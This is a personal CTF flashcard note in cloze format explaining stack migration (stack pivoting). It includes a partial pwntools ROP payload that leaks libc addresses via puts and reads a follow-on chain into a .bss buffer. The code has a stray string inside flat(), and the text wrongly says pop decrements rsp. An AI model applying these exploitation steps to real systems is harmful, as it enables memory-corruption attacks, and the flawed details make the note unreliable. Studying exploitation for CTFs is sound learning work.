---
aliases:
  - Stack Pivot
  - Stack Migration
tags:
  - flashcard/active/ctf/A
  - binary/exploit
---
# Stack Migration
Stack migration is a technique to {{continue ROP chains when buffer size is limited}} by {{moving the stack to another controllable location}}.

## Core Concept
- Uses {{function call, rbp, and leave;ret mechanisms}} to maintain ROP chain continuity
- Moves execution to {{a buffer (often in .bss) where we've pre-written our payload}}
- Leverages {{how leave;ret interacts with rbp and rsp}} to smoothly transition between locations

## Key Components

### Saved RBP
- Must contain {{address of the next buffer/payload}}
- Acts as {{bridge between current and next stack frame}}

### leave;ret Instruction
- Placed at {{end of current payload}}
- Controls RBP: {{Moves to restore next buffer address}}
- Controls RSP: {{Points to top of next frame}}
- After pop rbp, {{RSP points back to continuation of ROP chain}}

### gets@plt
- Must be called {{before leave;ret}}
- Used to {{write subsequent payload to next buffer}}

## Example
```py
payload3 = flat(
    '''
    leave = mov rsp, rbp ; pop rbp
    '''
    buf2, 
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    pop_rdi,
    buf2,
    pop_rsi,
    0x100,
    0,
    elf.sym['my_read'],
    leave_ret
)
```
Looking at the payload line by line:
- `buf2,`: When `leave` was performed in previous payload, {{`rsp` first points to `buf2,`}}. Then, `pop rbp` in `leave` is performed, which {{"restore" the fake rbp `buf2`}}. `rsp--` for the `pop` instruction, so nwo `rsp` points to `pop_rdi`.
```py
pop_rdi,
elf.got['puts'],
elf.plt['puts'],
```
- {{leaks the libc addresses of `puts`}}
```py
pop_rdi,
buf2,
pop_rsi,
0x100,
0,
elf.sym['my_read'],
```
- When the program jumps to `my_read` which is a function containing `read` function. {{The program stops and wait for input}}. `buf2` as the `rdi` is exactly where the {{input would be written to}}.
- `leave_ret`, again `leave` would make `rsp` points to `rbp`, which is the {{fake `rbp`, aka `buf2` we made earlier}}. The entire stack frame just migrates because of `leave`. `ret` {{just ret to the address following the `leave_ret` gadget which continues to ROP chain}}
